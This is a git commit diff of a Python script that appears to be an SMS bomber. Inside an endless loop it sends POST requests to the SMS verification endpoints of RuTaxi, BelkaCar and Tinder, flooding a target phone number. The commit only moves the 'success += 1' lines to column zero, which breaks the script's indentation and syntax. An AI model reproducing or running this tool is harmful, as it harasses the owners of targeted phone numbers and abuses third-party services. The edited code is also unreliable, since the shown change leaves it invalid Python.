ca788368a2a66d7996e40fb2b1f873b77f0a95d0
Harun MISTIK <har.mstk2015@gmail.com>
2020-02-22 21:25:33 +0300

    Add files via upload

--- sms1,2b.py
+++ sms1,2b.py
@@ -166,21 +166,21 @@ while True:
 	try:
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 		print('[+] RuTaxi Requests Successful!')
-                success += 1
+success += 1
 	except:
 		print('[-] RuTaxi Requests Failed!')
 
 	try:
 		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
 		print('[+] BelkaCar Requests Successful!')
-                success += 1
+success += 1
 	except:
 		print('[-] BelkaCar Requests Failed!')
 
 	try:
 		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
 		print('[+] Tinder Requests Successful!')
-                success += 1
+success += 1
 	except:
 		print('[-] Tinder Requests Failed!')
 
